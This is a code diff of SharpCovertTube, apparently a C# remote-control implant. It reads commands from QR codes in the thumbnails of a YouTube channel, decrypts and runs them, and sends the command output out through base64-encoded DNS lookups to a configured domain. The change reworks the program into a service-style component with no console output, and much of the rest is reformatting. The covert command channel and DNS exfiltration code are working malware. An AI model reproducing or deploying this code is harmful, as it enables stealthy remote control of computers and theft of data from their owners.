@@ -6,13 +6,13 @@ using System.Text;
 using System.Drawing;
 using System.Diagnostics;
 using System.Collections.Generic;
-using SharpCovertTube.QRCodeDecoder;
+using SharpCovertTube_Service.QRCodeDecoder;
 using System.Security.Cryptography;
 
 
-namespace SharpCovertTube
+namespace SharpCovertTube_Service
 {
-    internal class Program
+    internal class SharpCovertTube
     {
         /* Configuration values */
         // Channel ID (mandatory!!!). Get it from: https://www.youtube.com/account_advanced
@@ -25,8 +25,6 @@ namespace SharpCovertTube
         public const string payload_aes_iv = "0000000000000000";
         // Period between every check of the Youtube channel. Default is 10 minutes to avoid exceeding api quota
         public const int seconds_delay = 600;
-        // Show debug messages in console or not
-        public const bool debug_console = true;
         // Write debug messages in log file or not
         public const bool log_to_file = true;
         // Log file 
@@ -37,12 +35,11 @@ namespace SharpCovertTube
         public const string dns_hostname = ".test.org";
 
 
-        static void LogShow(string msg) {
-            msg = "[" + DateTime.Now.ToString("HH:mm:ss").ToString() + "]  " +  msg;
-            if (debug_console) { 
-                Console.WriteLine(msg);
-            }
-            if (log_to_file) {
+        static void LogShow(string msg)
+        {
+            msg = "[" + DateTime.Now.ToString("HH:mm:ss").ToString() + "]  " + msg;
+            if (log_to_file)
+            {
                 using (StreamWriter writer = File.AppendText(log_file))
                 {
                     writer.WriteLine(msg);
@@ -74,7 +71,7 @@ namespace SharpCovertTube
             string code = ByteArrayToStr(DataByteArray[0]);
             return code;
         }
-        
+
 
         static string ReadQR(string thumbnail_url)
         {
@@ -136,17 +133,19 @@ namespace SharpCovertTube
         }
 
 
-        static void DNSExfil(string response_cmd) {
+        static void DNSExfil(string response_cmd)
+        {
             // Base64-encode the response
             if (response_cmd == "")
             {
                 response_cmd = "null";
             }
             string base64_response_cmd = Base64Encode(response_cmd);
-            LogShow("Base64-encoded response:\t\t"+ base64_response_cmd);
+            LogShow("Base64-encoded response:\t\t" + base64_response_cmd);
             int max_size = 50; // 255 - dns_hostname.Length - 1; <-- These sizes generate errors and I dont know why
-            if (base64_response_cmd.Length > max_size) {
-                LogShow("Splitting encoded response in chunks of "+ max_size + " characters");
+            if (base64_response_cmd.Length > max_size)
+            {
+                LogShow("Splitting encoded response in chunks of " + max_size + " characters");
             }
             var parts = SplitInParts(base64_response_cmd, max_size);
             foreach (var response_portion in parts)
@@ -172,14 +171,16 @@ namespace SharpCovertTube
 
         static string TryDecrypt(string payload)
         {
-            try {
+            try
+            {
                 // Base64-decode
                 string base64_decoded = Base64Decode(payload);
                 string decrypted_cmd = DecryptStringFromBytes(base64_decoded, Encoding.ASCII.GetBytes(payload_aes_key), Encoding.ASCII.GetBytes(payload_aes_iv));
                 LogShow("Payload was AES-encrypted");
                 return decrypted_cmd;
             }
-            catch {
+            catch
+            {
                 LogShow("Payload was not AES-encrypted");
                 return payload;
             }
@@ -190,7 +191,7 @@ namespace SharpCovertTube
         {
             LogShow("Reading new video with ID: \t\t" + video_id);
             string thumbnail_url = "https://i.ytimg.com/vi/" + video_id + "/hqdefault.jpg";
-            
+
             // Read QR
             string qr_decoded_cmd = ReadQR(thumbnail_url);
             LogShow("Value decoded from QR:\t\t" + qr_decoded_cmd);
@@ -205,13 +206,15 @@ namespace SharpCovertTube
             LogShow("Response from command:\t\t" + response_cmd);
 
             // Exfiltrate
-            if (dns_exfiltration) {
+            if (dns_exfiltration)
+            {
                 DNSExfil(response_cmd);
             }
         }
 
 
-        static string getRequest(string url) {
+        static string getRequest(string url)
+        {
             WebRequest wrGETURL = WebRequest.Create(url);
             Stream objStream = wrGETURL.GetResponse().GetResponseStream();
             StreamReader objReader = new StreamReader(objStream);
@@ -241,7 +244,8 @@ namespace SharpCovertTube
         }
 
 
-        static void MonitorChannel(string channel_url, int seconds_delay) {
+        static void MonitorChannel(string channel_url, int seconds_delay)
+        {
             // Initial videos
             List<string> Initial_VideoIds = GetVideoIds(channel_url);
             int number_of_videos = Initial_VideoIds.Count;
@@ -253,14 +257,15 @@ namespace SharpCovertTube
             while (true)
             {
                 // Sleep
-                LogShow("Sleeping "+ seconds_delay + " seconds");
+                LogShow("Sleeping " + seconds_delay + " seconds");
                 System.Threading.Thread.Sleep(1000 * seconds_delay);
 
                 // Get list of videos
                 List<string> VideoIds = GetVideoIds(channel_url);
                 var firstNotSecond = VideoIds.Except(Initial_VideoIds);
                 // If new videos -> Read
-                if (firstNotSecond != null && firstNotSecond.Any()) {
+                if (firstNotSecond != null && firstNotSecond.Any())
+                {
                     LogShow("New video(s) uploaded!");
 
                     foreach (var video_id in firstNotSecond)
@@ -279,7 +284,7 @@ namespace SharpCovertTube
             }
         }
 
-    
+
         // AES Decrypt
         static string DecryptStringFromBytes(String cipherTextEncoded, byte[] Key, byte[] IV)
         {
@@ -311,9 +316,10 @@ namespace SharpCovertTube
         }
 
 
-        static void Main(string[] args)
+        public static void Start()
         {
-            if (channel_id == "" || api_key == "") {
+            if (channel_id == "" || api_key == "")
+            {
                 LogShow("It is necessary to fill the channel_id and api_key values before running the program.");
                 System.Environment.Exit(0);
             }
